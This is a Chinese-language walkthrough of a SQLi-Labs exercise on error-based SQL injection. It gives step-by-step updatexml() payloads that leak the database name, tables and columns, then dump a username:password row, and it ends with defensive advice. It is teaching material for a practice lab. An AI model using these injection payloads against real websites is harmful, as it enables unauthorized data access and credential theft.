## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：中等
- 通关标识：在页面无回显的情况下，利用 updatexml 报错注入，把账号密码通过报错信息带出来。

## 二、大白话原理讲解
前面的关卡，柜员（数据库）都会把你要的数据打印在屏幕上（回显）。但从这一关开始，柜员变“抠门”了，他把打印台撤了，不管你怎么查，他都不给你看结果（页面只显示 `You are in...`）。

既然他不给你看，那我们就得想办法让他**“疼”得叫出来**，并且把数据夹在叫声里。
MySQL 里有一种特殊的函数 `updatexml()`，它的作用本来是处理 XML 格式的数据。如果你给它传入不合法的格式，它就会直接大声报错（XPath syntax error）。
我们在报错的格式里故意拼接上 `~` 波浪号和我们想要查询的数据库名。当函数报错时，它就会把 `~security~` 这个错误内容直接打印在屏幕上。这样，我们就硬生生把金库的数据“喊”出来了。

## 三、解题步骤

**1. 测试注入点**
输入 `?id=1'`，页面报错，证明是单引号闭合的字符型注入。用 `--+` 注释后面代码。

**2. 尝试报错注入（爆库）**
直接使用 `updatexml` 函数来测试：
```sql
?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+
```
**结论**：页面报错 `XPATH syntax error: '~security~'`。成功爆出当前数据库名 `security`。

**3. 逐行爆出表名和字段名**
因为报错信息长度有限（32个字符），不能用 `group_concat` 一次性打包，必须用 `limit` 逐行读取。

*   **查表名**（先查第一张表）：
```sql
?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1) --+
```
（报错回显 `~emails~`，把 `limit 0,1` 改成 `limit 1,1`、`limit 2,1` 往下找，直到找到 `users` 表）

*   **查字段名**（查 users 表的第一个字段）：
```sql
?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),1) --+
```
（依次改 limit 找到 `username` 和 `password`）

**4. 终极拖库**
一次读取一行用户的账号密码：
```sql
?id=1' and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1) --+
```
**验证结果**：
页面成功报错并回显出 `XPATH syntax error: '~Dumb:Dumb~'`，成功获取第一个用户的账号密码。通关。

*(进阶：如果想一次性看多一点，可以使用 `substr` 截取 `group_concat` 打包后的数据，比如 `substr((select group_concat(username,0x3a,password) from users),1,30)`)*

## 四、知识点解析
1. **报错注入（Error-based）**：利用 `updatexml()` 或 `extractvalue()` 等函数，在因格式错误产生报错时，将查询结果作为错误信息的一部分回显出来。
2. **0x7e**：波浪号 `~` 的十六进制。因为错误信息默认自带引号（如 `'~security~'`），用波浪号包起来能更清晰地辨认出我们注入的内容。
3. **长度限制与 limit**：报错注入回显的数据长度通常有严格限制（大约 32 个字符），所以当需要读取多行数据时，必须借助 `limit m,n` 逐行读取。

## 五、总结与防御
**本题总结**：
无回显时不要慌，寻找页面报错。只要页面能暴露 SQL 报错信息，就可以利用 `updatexml` 把数据“喊”出来。

**安全防御建议**：
- **关闭报错回显**：在生产环境中，必须关闭 PHP 的 `display_errors` 或数据库的详细报错，统一返回模糊的错误提示，让攻击者无计可施。
- **预编译语句（PDO/MySQLi）**：从根源上阻断注入。
